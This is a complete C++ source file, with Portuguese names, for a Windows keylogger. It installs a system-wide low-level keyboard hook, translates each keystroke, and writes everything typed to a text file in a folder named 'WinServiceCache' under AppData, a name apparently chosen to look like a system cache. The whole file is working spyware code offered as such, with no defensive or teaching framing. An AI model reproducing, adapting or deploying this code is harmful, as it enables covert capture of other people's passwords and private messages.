#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <mutex>
#include <Windows.h>

namespace fs = std::filesystem;

class KeyLogger {
private:
    fs::path arquivo_log;
    std::string buffer;
    size_t buffer_limit;
    std::mutex mtx;

    std::string traduzir_tecla(DWORD vkCode) {
        switch (vkCode) {
            case VK_SPACE: return " ";
            case VK_RETURN: return "\n";
            case VK_TAB:    return "\t";
            case VK_BACK:   return "[BACKSPACE]";
            case VK_SHIFT:  return "";
            case VK_LSHIFT: return "";
            case VK_RSHIFT: return "";
            case VK_CONTROL: return "[CTRL]";
            case VK_LCONTROL: return "[LCTRL]";
            case VK_RCONTROL: return "[RCTRL]";
            case VK_MENU:   return "[ALT]";
            case VK_CAPITAL: return "[CAPS]";
            case VK_ESCAPE: return "[ESC]";
            default: break;
        }

        char key = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
        if (key > 0) {
            return std::string(1, key);
        }
        return "[UNK:" + std::to_string(vkCode) + "]";
    }

public:
    KeyLogger(size_t limit = 50) : buffer_limit(limit) {
        const char* appdata = std::getenv("APPDATA");
        if (appdata) {
            fs::path cache_path = fs::path(appdata) / "WinServiceCache";

            try {
                if (!fs::exists(cache_path)) {
                    fs::create_directories(cache_path);
                }
                this->arquivo_log = cache_path / "text.txt";
            } catch (const std::exception& e) {
                std::cerr << "Erro ao criar diretorio: " << e.what() << std::endl;
            }
        } else {
            this->arquivo_log = "keylog_fallback.txt";
        }
    }

    void salvar_no_arquivo() {
        std::lock_guard<std::mutex> lock(mtx);
        
        if (buffer.empty()) return;

        std::ofstream arquivo(arquivo_log, std::ios::app);
        if (arquivo.is_open()) {
            arquivo << buffer;
            arquivo.close();
            buffer.clear();
        } else {
            std::cerr << "Erro ao abrir arquivo: " << arquivo_log << std::endl;
        }
    }

    void processar_tecla(DWORD vkCode) {
        std::lock_guard<std::mutex> lock(mtx);
        if (vkCode == VK_BACK) {
            if (!buffer.empty()) {
                buffer.pop_back();
            }
            return;
        }

        std::string tecla_formatada = traduzir_tecla(vkCode);
        
        if (!tecla_formatada.empty()) {
            buffer += tecla_formatada;
        }

        if (buffer.length() >= buffer_limit) {
            std::ofstream arquivo(arquivo_log, std::ios::app);
            if (arquivo.is_open()) {
                arquivo << buffer;
                arquivo.close();
                buffer.clear();
            }
        }
    }

    fs::path get_log_path() const {
        return arquivo_log;
    }
};

HHOOK hHook = NULL;
KeyLogger* loggerGlobal = nullptr;
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
            if (loggerGlobal) {
                loggerGlobal->processar_tecla(pKey->vkCode);
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    KeyLogger logger(100);
    loggerGlobal = &logger;
    std::cout << "Logger iniciado (C++ Port). Salvando em: " << logger.get_log_path() << std::endl;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);

    if (hHook == NULL) {
        std::cerr << "Falha ao instalar o hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (loggerGlobal) {
        loggerGlobal->salvar_no_arquivo();
    }
    UnhookWindowsHookEx(hHook);

    return 0;
}